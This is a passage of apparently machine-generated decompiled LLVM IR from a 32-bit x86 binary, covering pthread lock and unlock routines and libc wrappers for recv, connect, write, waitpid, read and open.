  %v2_80583b1 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8058397

dec_label_pc_8058397:                             ; preds = %dec_label_pc_80583b5.dec_label_pc_8058397_crit_edge, %entry
  %v0_8058397 = phi i32 [ %v0_8058397.pre, %dec_label_pc_80583b5.dec_label_pc_8058397_crit_edge ], [ %tmp9, %entry ]
  %v1_8058397 = inttoptr i32 %v0_8058397 to i32*
  %v2_8058397 = load i32, i32* %v1_8058397, align 4
  store i32 %v2_8058397, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_805839e = icmp eq i32 %v2_8058397, 0
  br i1 %v1_805839e, label %dec_label_pc_80583b5, label %dec_label_pc_80583a2

dec_label_pc_80583a2:                             ; preds = %dec_label_pc_8058397
  %v0_80583a2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80583a2 = icmp eq i32 %v0_80583a2, 0
  %v1_80583a4 = icmp eq i1 %v1_80583a2, false
  br i1 %v1_80583a4, label %dec_label_pc_80583ad, label %dec_label_pc_80583a6

dec_label_pc_80583a6:                             ; preds = %dec_label_pc_80583a2
  %v0_80583a6 = call i32 @thread_self.8()
  store i32 %v0_80583a6, i32* %edx.global-to-local, align 4
  %v0_80583c3.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80583ad

dec_label_pc_80583ad:                             ; preds = %dec_label_pc_80583a2, %dec_label_pc_80583a6
  %v0_80583c3.pre = phi i32 [ %v0_8058397, %dec_label_pc_80583a2 ], [ %v0_80583c3.pre.pre, %dec_label_pc_80583a6 ]
  store i32 %v2_80583b1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80583b5

dec_label_pc_80583b5:                             ; preds = %dec_label_pc_8058397, %dec_label_pc_80583ad
  %v3_80583c3 = phi i32 [ 1, %dec_label_pc_8058397 ], [ %v2_80583b1, %dec_label_pc_80583ad ]
  %v24_80583c3 = phi i32 [ %v0_8058397, %dec_label_pc_8058397 ], [ %v0_80583c3.pre, %dec_label_pc_80583ad ]
  store i32 %v2_8058397, i32* %stack_var_-20, align 4
  %v1_80583c3 = inttoptr i32 %v24_80583c3 to i32*
  %v2_80583c3 = load i32, i32* %v1_80583c3, align 4
  %v15_80583c3 = icmp eq i32 %v2_8058397, %v2_80583c3
  %v22_80583c3 = select i1 %v15_80583c3, i32 %v3_80583c3, i32 %v2_80583c3
  store i32 %v22_80583c3, i32* %v1_80583c3, align 4
  %v1_80583c7 = zext i1 %v15_80583c3 to i32
  %v2_80583c7 = load i32, i32* %ecx.global-to-local, align 4
  %v3_80583c7 = and i32 %v2_80583c7, -256
  %v4_80583c7 = or i32 %v3_80583c7, %v1_80583c7
  store i32 %v4_80583c7, i32* @ecx, align 4
  %v4_80583ca = icmp eq i1 %v15_80583c3, false
  br i1 %v4_80583ca, label %dec_label_pc_80583b5.dec_label_pc_8058397_crit_edge, label %dec_label_pc_80583ce

dec_label_pc_80583b5.dec_label_pc_8058397_crit_edge: ; preds = %dec_label_pc_80583b5
  %v0_8058397.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058397

dec_label_pc_80583ce:                             ; preds = %dec_label_pc_80583b5
  br i1 %v1_805839e, label %dec_label_pc_80583d9, label %dec_label_pc_80583d2

dec_label_pc_80583d2:                             ; preds = %dec_label_pc_80583ce
  %v0_80583d2 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80583d2, i32* @eax, align 4
  %v0_80583d4 = load i32, i32* %stack_var_-20, align 4
  %v2_80583d4 = call i32 @suspend.9(i32 %v0_80583d4, i32 0)
  br label %dec_label_pc_80583d9

dec_label_pc_80583d9:                             ; preds = %dec_label_pc_80583ce, %dec_label_pc_80583d2
  %v0_80583de = phi i32 [ 0, %dec_label_pc_80583ce ], [ %v2_80583d4, %dec_label_pc_80583d2 ]
  %v2_80583dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80583dc, i32* @ebx, align 4
  store i32 %v0_805838a, i32* @esi, align 4
  ret i32 %v0_80583de

; uselistorder directives
  uselistorder i1 %v15_80583c3, { 1, 2, 0 }
  uselistorder i32 %v2_80583c3, { 1, 0 }
  uselistorder i32 %v0_8058397, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80583d9, { 1, 0 }
  uselistorder label %dec_label_pc_80583b5, { 1, 0 }
  uselistorder label %dec_label_pc_80583ad, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_80583e0 = load i32, i32* @edi, align 4
  %v0_80583e1 = load i32, i32* @edx, align 4
  store i32 %v0_80583e1, i32* @edi, align 4
  %v0_80583e3 = load i32, i32* @esi, align 4
  %v0_80583e4 = load i32, i32* @ebx, align 4
  %v0_80583e5 = load i32, i32* @eax, align 4
  store i32 %v0_80583e5, i32* @ebx, align 4
  %v1_80583ea = inttoptr i32 %v0_80583e5 to i32*
  %v2_80583ea = load i32, i32* %v1_80583ea, align 4
  %v3_80583ea = icmp eq i32 %v2_80583ea, 0
  %v1_80583ed = icmp eq i1 %v3_80583ea, false
  br i1 %v1_80583ed, label %dec_label_pc_8058403, label %dec_label_pc_80583ef

dec_label_pc_80583ef:                             ; preds = %entry
  store i32 0, i32* @ecx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80583f8 = load i32, i32* %v1_80583ea, align 4
  %v15_80583f8 = icmp eq i32 %v2_80583f8, 0
  %v22_80583f8 = select i1 %v15_80583f8, i32 1, i32 %v2_80583f8
  store i32 %v22_80583f8, i32* %v1_80583ea, align 4
  %v1_80583fc = zext i1 %v15_80583f8 to i32
  %v2_80583fc = load i32, i32* %edx.global-to-local, align 4
  %v3_80583fc = and i32 %v2_80583fc, -256
  %v4_80583fc = or i32 %v3_80583fc, %v1_80583fc
  store i32 %v4_80583fc, i32* %edx.global-to-local, align 4
  %v4_80583ff = icmp eq i1 %v15_80583f8, false
  %v1_8058401 = icmp eq i1 %v4_80583ff, false
  br i1 %v1_8058401, label %dec_label_pc_8058462, label %dec_label_pc_8058403

dec_label_pc_8058403:                             ; preds = %dec_label_pc_80583ef, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8058405

dec_label_pc_8058405:                             ; preds = %dec_label_pc_8058434, %dec_label_pc_8058452, %dec_label_pc_8058445.preheader, %dec_label_pc_8058403
  %v0_8058405 = load i32, i32* @ebx, align 4
  %v1_8058405 = inttoptr i32 %v0_8058405 to i32*
  %v2_8058405 = load i32, i32* %v1_8058405, align 4
  store i32 %v2_8058405, i32* @esi, align 4
  %v1_8058407 = urem i32 %v2_8058405, 2
  %v2_8058407 = icmp eq i32 %v1_8058407, 0
  %v1_805840d = icmp eq i1 %v2_8058407, false
  br i1 %v1_805840d, label %dec_label_pc_805841b, label %dec_label_pc_805840f

dec_label_pc_805840f:                             ; preds = %dec_label_pc_8058405
  store i32 %v2_8058405, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_805842d.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805842d

dec_label_pc_805841b:                             ; preds = %dec_label_pc_8058405
  %v0_805841b = load i32, i32* @edi, align 4
  %v1_805841b = icmp eq i32 %v0_805841b, 0
  %v1_805841d = icmp eq i1 %v1_805841b, false
  br i1 %v1_805841d, label %dec_label_pc_8058426, label %dec_label_pc_805841f

dec_label_pc_805841f:                             ; preds = %dec_label_pc_805841b
  %v0_805841f = call i32 @thread_self.8()
  store i32 %v0_805841f, i32* @edi, align 4
  br label %dec_label_pc_8058426

dec_label_pc_8058426:                             ; preds = %dec_label_pc_805841b, %dec_label_pc_805841f
  %v0_8058426 = phi i32 [ %v0_805841b, %dec_label_pc_805841b ], [ %v0_805841f, %dec_label_pc_805841f ]
  store i32 %v0_8058426, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805842d

dec_label_pc_805842d:                             ; preds = %dec_label_pc_805840f, %dec_label_pc_8058426
  %v1_8058431 = phi i32 [ %v0_805842d.pre, %dec_label_pc_805840f ], [ %v0_8058426, %dec_label_pc_8058426 ]
  %v0_805840f.sink = phi i32 [ %v2_8058405, %dec_label_pc_805840f ], [ %v0_8058426, %dec_label_pc_8058426 ]
  %v1_8058416 = or i32 %v0_805840f.sink, 1
  store i32 %v1_8058416, i32* %ecx.global-to-local, align 4
  %v1_805842d = icmp eq i32 %v1_8058431, 0
  br i1 %v1_805842d, label %dec_label_pc_8058434, label %dec_label_pc_8058431

dec_label_pc_8058431:                             ; preds = %dec_label_pc_805842d
  %v0_8058431 = load i32, i32* @esi, align 4
  %v2_8058431 = add i32 %v1_8058431, 12
  %v3_8058431 = inttoptr i32 %v2_8058431 to i32*
  store i32 %v0_8058431, i32* %v3_8058431, align 4
  %v3_8058436.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8058434

dec_label_pc_8058434:                             ; preds = %dec_label_pc_805842d, %dec_label_pc_8058431
  %v3_8058436 = phi i32 [ %v1_8058416, %dec_label_pc_805842d ], [ %v3_8058436.pre, %dec_label_pc_8058431 ]
  %v0_8058434 = load i32, i32* @esi, align 4
  %v0_8058436 = load i32, i32* @ebx, align 4
  %v1_8058436 = inttoptr i32 %v0_8058436 to i32*
  %v2_8058436 = load i32, i32* %v1_8058436, align 4
  %v15_8058436 = icmp eq i32 %v0_8058434, %v2_8058436
  %v22_8058436 = select i1 %v15_8058436, i32 %v3_8058436, i32 %v2_8058436
  store i32 %v22_8058436, i32* %v1_8058436, align 4
  %v1_805843a = zext i1 %v15_8058436 to i32
  %v2_805843a = load i32, i32* %ecx.global-to-local, align 4
  %v3_805843a = and i32 %v2_805843a, -256
  %v4_805843a = or i32 %v3_805843a, %v1_805843a
  store i32 %v4_805843a, i32* @ecx, align 4
  %v4_805843d = icmp eq i1 %v15_8058436, false
  br i1 %v4_805843d, label %dec_label_pc_8058405, label %dec_label_pc_8058441

dec_label_pc_8058441:                             ; preds = %dec_label_pc_8058434
  %v0_8058441 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058441 = icmp eq i32 %v0_8058441, 0
  %v1_8058443 = icmp eq i1 %v1_8058441, false
  br i1 %v1_8058443, label %dec_label_pc_805845c.preheader, label %dec_label_pc_8058445.preheader

dec_label_pc_805845c.preheader:                   ; preds = %dec_label_pc_8058441
  %v0_805845c14 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805845c15 = add i32 %v0_805845c14, -1
  store i32 %v1_805845c15, i32* %ebp.global-to-local, align 4
  %v10_805845d16 = icmp eq i32 %v0_805845c14, 0
  %v1_805846018 = icmp eq i1 %v10_805845d16, false
  br i1 %v1_805846018, label %dec_label_pc_8058455, label %dec_label_pc_8058462

dec_label_pc_8058445.preheader:                   ; preds = %dec_label_pc_8058441
  %v0_8058445.pre = load i32, i32* @edi, align 4
  store i32 %v0_8058445.pre, i32* @eax, align 4
  %v2_805844719 = call i32 @suspend.9(i32 %v0_80583e4, i32 %v0_80583e3)
  %v0_805844c20 = load i32, i32* @edi, align 4
  %v1_805844c21 = add i32 %v0_805844c20, 12
  %v2_805844c22 = inttoptr i32 %v1_805844c21 to i32*
  %v3_805844c23 = load i32, i32* %v2_805844c22, align 4
  %v4_805844c24 = icmp eq i32 %v3_805844c23, 0
  br i1 %v4_805844c24, label %dec_label_pc_8058405, label %dec_label_pc_8058452

dec_label_pc_8058452:                             ; preds = %dec_label_pc_8058445.preheader, %dec_label_pc_8058452
  %v0_805844c26 = phi i32 [ %v0_805844c, %dec_label_pc_8058452 ], [ %v0_805844c20, %dec_label_pc_8058445.preheader ]
  %v0_8058452 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8058452 = add i32 %v0_8058452, 1
  store i32 %v1_8058452, i32* %ebp.global-to-local, align 4
  store i32 %v0_805844c26, i32* @eax, align 4
  %v2_8058447 = call i32 @suspend.9(i32 %v0_80583e4, i32 %v0_80583e3)
  %v0_805844c = load i32, i32* @edi, align 4
  %v1_805844c = add i32 %v0_805844c, 12
  %v2_805844c = inttoptr i32 %v1_805844c to i32*
  %v3_805844c = load i32, i32* %v2_805844c, align 4
  %v4_805844c = icmp eq i32 %v3_805844c, 0
  br i1 %v4_805844c, label %dec_label_pc_8058405, label %dec_label_pc_8058452

dec_label_pc_8058455:                             ; preds = %dec_label_pc_805845c.preheader, %dec_label_pc_8058455
  %v0_8058455 = load i32, i32* @edi, align 4
  store i32 %v0_8058455, i32* @eax, align 4
  %v0_8058457 = call i32 @restart.7()
  %v0_805845c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805845c = add i32 %v0_805845c, -1
  store i32 %v1_805845c, i32* %ebp.global-to-local, align 4
  %v10_805845d = icmp eq i32 %v0_805845c, 0
  %v1_8058460 = icmp eq i1 %v10_805845d, false
  br i1 %v1_8058460, label %dec_label_pc_8058455, label %dec_label_pc_8058462

dec_label_pc_8058462:                             ; preds = %dec_label_pc_805845c.preheader, %dec_label_pc_8058455, %dec_label_pc_80583ef
  %v0_8058469 = phi i32 [ %v2_80583f8, %dec_label_pc_80583ef ], [ %v0_8058434, %dec_label_pc_805845c.preheader ], [ %v0_8058457, %dec_label_pc_8058455 ]
  store i32 %v0_80583e4, i32* @ebx, align 4
  store i32 %v0_80583e3, i32* @esi, align 4
  store i32 %v0_80583e0, i32* @edi, align 4
  ret i32 %v0_8058469

; uselistorder directives
  uselistorder i32 %v0_805844c, { 1, 0 }
  uselistorder i1 %v15_8058436, { 1, 2, 0 }
  uselistorder i32 %v2_8058436, { 1, 0 }
  uselistorder i32 %v0_8058426, { 1, 0, 2 }
  uselistorder i32 %v2_8058405, { 2, 1, 0, 3 }
  uselistorder i1 %v15_80583f8, { 1, 0, 2 }
  uselistorder i32 %v2_80583f8, { 0, 2, 1 }
  uselistorder i32 %v0_80583e4, { 1, 2, 0 }
  uselistorder i32 %v0_80583e3, { 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 (i32, i32)* @suspend.9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058462, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058455, { 1, 0 }
  uselistorder label %dec_label_pc_8058452, { 1, 0 }
  uselistorder label %dec_label_pc_8058434, { 1, 0 }
  uselistorder label %dec_label_pc_805842d, { 1, 0 }
  uselistorder label %dec_label_pc_8058426, { 1, 0 }
  uselistorder label %dec_label_pc_8058405, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_805846d = load i32, i32* @ebx, align 4
  store i32 %v0_805846d, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_8058486

dec_label_pc_8058477:                             ; preds = %dec_label_pc_8058486
  %v2_805847b = load i32, i32* %v1_8058486, align 4
  %v15_805847b = icmp eq i32 %v2_805847b, 1
  %v22_805847b = select i1 %v15_805847b, i32 0, i32 %v2_805847b
  store i32 %v22_805847b, i32* %v1_8058486, align 4
  %v1_805847f = zext i1 %v15_805847b to i32
  %v2_805847f = load i32, i32* %edx.global-to-local, align 4
  %v3_805847f = and i32 %v2_805847f, -256
  %v4_805847f = or i32 %v3_805847f, %v1_805847f
  store i32 %v4_805847f, i32* @edx, align 4
  %v4_8058482 = icmp eq i1 %v15_805847b, false
  %v1_8058484 = icmp eq i1 %v4_8058482, false
  br i1 %v1_8058484, label %dec_label_pc_8058503.loopexit, label %dec_label_pc_8058486.backedge

dec_label_pc_8058486.backedge:                    ; preds = %dec_label_pc_8058477, %dec_label_pc_80584c2
  %v0_8058486.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8058486

dec_label_pc_8058486:                             ; preds = %dec_label_pc_8058486.backedge, %entry
  %v0_805847b = phi i32 [ %v0_8058486.pre, %dec_label_pc_8058486.backedge ], [ %tmp27, %entry ]
  %v1_8058486 = inttoptr i32 %v0_805847b to i32*
  %v2_8058486 = load i32, i32* %v1_8058486, align 4
  store i32 %v2_8058486, i32* %edx.global-to-local, align 4
  %v9_8058488 = icmp eq i32 %v2_8058486, 1
  br i1 %v9_8058488, label %dec_label_pc_8058477, label %dec_label_pc_805848d

dec_label_pc_805848d:                             ; preds = %dec_label_pc_8058486
  %v1_805848f = and i32 %v2_8058486, -2
  store i32 %v1_805848f, i32* %edi.global-to-local, align 4
  %v1_80584ba3 = icmp eq i32 %v1_805848f, 0
  %v1_80584bc10 = icmp eq i1 %v1_80584ba3, false
  br i1 %v1_80584bc10, label %dec_label_pc_80584a2, label %dec_label_pc_80584c2

dec_label_pc_80584a2:                             ; preds = %dec_label_pc_805848d, %dec_label_pc_80584b1
  %v0_80584be25 = phi i32 [ %v0_80584be24, %dec_label_pc_80584b1 ], [ %v0_805847b, %dec_label_pc_805848d ]
  %v0_80584ab = phi i32 [ %v1_80584b1, %dec_label_pc_80584b1 ], [ %v0_805847b, %dec_label_pc_805848d ]
  %v0_80584b1 = phi i32 [ %v1_80584b7, %dec_label_pc_80584b1 ], [ %v1_805848f, %dec_label_pc_805848d ]
  %stack_var_-32.111 = phi i32 [ %stack_var_-32.0, %dec_label_pc_80584b1 ], [ 0, %dec_label_pc_805848d ]
  %v1_80584a2 = add i32 %v0_80584b1, 24
  %v2_80584a2 = inttoptr i32 %v1_80584a2 to i32*
  %v3_80584a2 = load i32, i32* %v2_80584a2, align 4
  %v5_80584a9 = icmp slt i32 %v3_80584a2, %stack_var_-32.111
  br i1 %v5_80584a9, label %dec_label_pc_80584b1, label %dec_label_pc_80584ab

dec_label_pc_80584ab:                             ; preds = %dec_label_pc_80584a2
  br label %dec_label_pc_80584b1

dec_label_pc_80584b1:                             ; preds = %dec_label_pc_80584a2, %dec_label_pc_80584ab
  %v0_80584be24 = phi i32 [ %v0_80584be25, %dec_label_pc_80584a2 ], [ %v0_80584ab, %dec_label_pc_80584ab ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.111, %dec_label_pc_80584a2 ], [ %v3_80584a2, %dec_label_pc_80584ab ]
  %v1_80584b1 = add i32 %v0_80584b1, 12
  %v2_80584b4 = inttoptr i32 %v1_80584b1 to i32*
  %v3_80584b4 = load i32, i32* %v2_80584b4, align 4
  %v1_80584b7 = and i32 %v3_80584b4, -2
  %v1_80584ba = icmp eq i32 %v1_80584b7, 0
  %v1_80584bc = icmp eq i1 %v1_80584ba, false
  br i1 %v1_80584bc, label %dec_label_pc_80584a2, label %dec_label_pc_80584be

dec_label_pc_80584be:                             ; preds = %dec_label_pc_80584b1
  %v12_80584be = icmp eq i32 %v0_80584be24, %v0_805847b
  %v1_80584c0 = icmp eq i1 %v12_80584be, false
  br i1 %v1_80584c0, label %dec_label_pc_80584d7, label %dec_label_pc_80584c2

dec_label_pc_80584c2:                             ; preds = %dec_label_pc_805848d, %dec_label_pc_80584be
  %v1_80584c2 = add i32 %v1_805848f, 12
  %v2_80584c2 = inttoptr i32 %v1_80584c2 to i32*
  %v3_80584c2 = load i32, i32* %v2_80584c2, align 4
  %v1_80584c7 = and i32 %v3_80584c2, -2
  store i32 %v1_80584c7, i32* @ebx, align 4
  %v2_80584ca = load i32, i32* %v1_8058486, align 4
  %v15_80584ca = icmp eq i32 %v2_8058486, %v2_80584ca
  %v22_80584ca = select i1 %v15_80584ca, i32 %v1_80584c7, i32 %v2_80584ca
  store i32 %v22_80584ca, i32* %v1_8058486, align 4
  %v1_80584ce = zext i1 %v15_80584ca to i32
  %v2_80584ce = load i32, i32* %edx.global-to-local, align 4
  %v3_80584ce = and i32 %v2_80584ce, -256
  %v4_80584ce = or i32 %v3_80584ce, %v1_80584ce
  store i32 %v4_80584ce, i32* %edx.global-to-local, align 4
  %v4_80584d1 = icmp eq i1 %v15_80584ca, false
  br i1 %v4_80584d1, label %dec_label_pc_8058486.backedge, label %dec_label_pc_80584f5

dec_label_pc_80584d7:                             ; preds = %dec_label_pc_80584be
  %v1_80584d7 = inttoptr i32 %v0_80584be24 to i32*
  %v2_80584d7 = load i32, i32* %v1_80584d7, align 4
  %v1_80584d9 = and i32 %v2_80584d7, -2
  store i32 %v1_80584d9, i32* %edi.global-to-local, align 4
  %v1_80584dc = add i32 %v1_80584d9, 12
  %v2_80584dc = inttoptr i32 %v1_80584dc to i32*
  %v3_80584dc = load i32, i32* %v2_80584dc, align 4
  store i32 %v3_80584dc, i32* %v1_80584d7, align 4
  br label %dec_label_pc_80584e1

dec_label_pc_80584e1:                             ; preds = %dec_label_pc_80584e1, %dec_label_pc_80584d7
  %v0_80584e1 = load i32, i32* @ecx, align 4
  %v1_80584e1 = inttoptr i32 %v0_80584e1 to i32*
  %v2_80584e1 = load i32, i32* %v1_80584e1, align 4
  store i32 %v2_80584e1, i32* %edx.global-to-local, align 4
  %v1_80584e7 = and i32 %v2_80584e1, -2
  store i32 %v1_80584e7, i32* @ebx, align 4
  %v2_80584ea = load i32, i32* %v1_80584e1, align 4
  %v15_80584ea = icmp eq i32 %v2_80584e1, %v2_80584ea
  %v22_80584ea = select i1 %v15_80584ea, i32 %v1_80584e7, i32 %v2_80584ea
  store i32 %v22_80584ea, i32* %v1_80584e1, align 4
  %v1_80584ee = zext i1 %v15_80584ea to i32
  %v2_80584ee = load i32, i32* %edx.global-to-local, align 4
  %v3_80584ee = and i32 %v2_80584ee, -256
  %v4_80584ee = or i32 %v3_80584ee, %v1_80584ee
  store i32 %v4_80584ee, i32* %edx.global-to-local, align 4
  %v4_80584f1 = icmp eq i1 %v15_80584ea, false
  br i1 %v4_80584f1, label %dec_label_pc_80584e1, label %dec_label_pc_80584f5

dec_label_pc_80584f5:                             ; preds = %dec_label_pc_80584c2, %dec_label_pc_80584e1
  %v0_80584f5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80584f5 = add i32 %v0_80584f5, 12
  %v2_80584f5 = inttoptr i32 %v1_80584f5 to i32*
  store i32 0, i32* %v2_80584f5, align 4
  %v0_80584fc = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80584fc, i32* @eax, align 4
  %v0_80584fe = call i32 @restart.7()
  br label %dec_label_pc_8058503

dec_label_pc_8058503.loopexit:                    ; preds = %dec_label_pc_8058477
  br label %dec_label_pc_8058503

dec_label_pc_8058503:                             ; preds = %dec_label_pc_8058503.loopexit, %dec_label_pc_80584f5
  %v2_8058508 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058508, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i1 %v15_80584ea, { 1, 2, 0 }
  uselistorder i32 %v2_80584ea, { 1, 0 }
  uselistorder i1 %v15_80584ca, { 1, 2, 0 }
  uselistorder i32 %v2_80584ca, { 1, 0 }
  uselistorder i32 %v1_80584b7, { 1, 0 }
  uselistorder i32 %v1_80584b1, { 1, 0 }
  uselistorder i32 %stack_var_-32.111, { 1, 0 }
  uselistorder i32 %v1_805848f, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8058486, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_805847b, { 2, 0, 1, 3 }
  uselistorder i1 %v15_805847b, { 1, 2, 0 }
  uselistorder i32 %v2_805847b, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80584f5, { 1, 0 }
  uselistorder label %dec_label_pc_80584c2, { 1, 0 }
  uselistorder label %dec_label_pc_80584b1, { 1, 0 }
  uselistorder label %dec_label_pc_80584a2, { 1, 0 }
  uselistorder label %dec_label_pc_8058486.backedge, { 1, 0 }
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805871c = load i32, i32* @ebx, align 4
  store i32 %v0_805871c, i32* %stack_var_-4, align 4
  %v2_8058720 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058727 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058720)
  %v4_805873c = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_8058746 = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_805873c, i32* @ebx, align 4
  %v2_805874c = trunc i32 %v3_8058746 to i8
  %v3_805874c = call i32 @__GI_pthread_setcanceltype(i8 %v2_805874c, i32 0)
  %v0_8058754 = load i32, i32* @ebx, align 4
  %v2_8058756 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058756, i32* @ebx, align 4
  ret i32 %v0_8058754
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058758 = load i32, i32* @ebx, align 4
  store i32 %v0_8058758, i32* %stack_var_-4, align 4
  %v2_805875c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058763 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805875c)
  %v3_8058777 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8058777, i32* @ebx, align 4
  %v3_8058782 = load i32, i32* %stack_var_-8, align 4
  %v2_8058786 = trunc i32 %v3_8058782 to i8
  %v3_8058786 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058786, i32 0)
  %v0_805878e = load i32, i32* @ebx, align 4
  %v2_8058790 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058790, i32* @ebx, align 4
  ret i32 %v0_805878e
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80587cc = load i32, i32* @ebx, align 4
  store i32 %v0_80587cc, i32* %stack_var_-4, align 4
  %v2_80587d0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80587d7 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80587d0)
  %v3_80587eb = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_80587eb, i32* @ebx, align 4
  %v3_80587f6 = load i32, i32* %stack_var_-8, align 4
  %v2_80587fa = trunc i32 %v3_80587f6 to i8
  %v3_80587fa = call i32 @__GI_pthread_setcanceltype(i8 %v2_80587fa, i32 0)
  %v0_8058802 = load i32, i32* @ebx, align 4
  %v2_8058804 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058804, i32* @ebx, align 4
  ret i32 %v0_8058802
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058806 = load i32, i32* @ebx, align 4
  store i32 %v0_8058806, i32* %stack_var_-4, align 4
  %v2_805880a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058811 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805880a)
  %v3_8058825 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8058825, i32* @ebx, align 4
  %v3_8058830 = load i32, i32* %stack_var_-8, align 4
  %v2_8058834 = trunc i32 %v3_8058830 to i8
  %v3_8058834 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058834, i32 0)
  %v0_805883c = load i32, i32* @ebx, align 4
  %v2_805883e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805883e, i32* @ebx, align 4
  ret i32 %v0_805883c
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80588d4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80588db = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80588d4)
  %v3_80588ef = call i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_80588ef, i32* @ebx, align 4
  %v3_80588fa = load i32, i32* %stack_var_-8, align 4
  %v2_80588fe = trunc i32 %v3_80588fa to i8
  %v3_80588fe = call i32 @__GI_pthread_setcanceltype(i8 %v2_80588fe, i32 0)
  %v0_8058906 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058906
}

define i32 @open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058a39 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058a40 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058a39)
  %v3_8058a5c = trunc i32 %arg2 to i8
  %v4_8058a5c = call i32 @__libc_open(i32 %arg1, i8 %v3_8058a5c, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_8058a5c, i32* @ebx, align 4
  %v3_8058a67 = load i32, i32* %stack_var_-8, align 4
  %v2_8058a6b = trunc i32 %v3_8058a67 to i8
